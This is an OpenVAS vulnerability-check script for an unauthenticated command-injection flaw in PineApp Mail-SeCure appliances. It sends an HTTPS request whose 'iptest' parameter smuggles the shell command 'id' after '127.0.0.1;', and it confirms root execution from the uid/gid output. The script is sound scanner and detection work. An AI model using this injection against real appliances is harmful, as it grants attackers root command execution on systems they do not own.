###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_pineapp_mailsecure_61477.nasl 11 2013-10-27 10:12:02Z jan $
#
# PineApp Mail-SeCure 'test_li_connection.php' Remote Command Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploits will result in the execution of arbitrary commands
with root privileges in the context of the affected appliance.

Authentication is not required to exploit this vulnerability.
Impact Level: System/Application";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103748";

tag_insight = "Input to the 'iptest' value is not properly sanitized in
'test_li_connection.php'";


tag_affected = "PineApp Mail-SeCure Series.";

tag_summary = "The remote PineApp Mail-SeCure is prone to a remote command-injection
vulnerability.";

tag_solution = "Ask the Vendor for an update.";

tag_vuldetect = "Send a crafted HTTP GET request and check the response.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(61477);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("PineApp Mail-SeCure 'test_li_connection.php' Remote Command Injection Vulnerability");

 desc = "
Summary:
" + tag_summary + "

Vulnerability Detection:
" + tag_vuldetect + "

Vulnerability Insight:
" + tag_insight + "

Impact:
" + tag_impact + "

Affected Software/OS:
" + tag_affected + "

Solution:
" + tag_solution;

 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61477");
 script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-13-188/");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-08-06 17:22:24 +0200 (Tue, 06 Aug 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute the 'id' command");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports(7443);
 script_exclude_keys("Settings/disable_cgi_scanning","PineApp/missing");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

 exit(0);
}

include("http_func.inc");
include("misc_func.inc");
include("openvas-https.inc");

port = 7443;
if(!get_port_state(port))exit(0); 

host = get_host_name();

req = 'GET / HTTP/1.1\r\nHost: ' + host + '\r\n\r\n';

resp = https_req_get(port:port, request:req);

if("PineApp" >!< resp) {
  set_kb_item(name:"PineApp/missing", value:TRUE); 
  exit(0);
}  

req = 'GET /admin/test_li_connection.php?actiontest=1&idtest=' + rand_str(length:8, charset:'0123456789')  + '&iptest=127.0.0.1;id HTTP/1.1\r\n' + 
      'Host: ' + host + '\r\n\r\n'; 

resp = https_req_get(port:port, request:req);

if(resp =~ "uid=[0-9]+.*gid=[0-9]+.*") {

  security_hole(port:port);
  exit(0);

}  

exit(0);
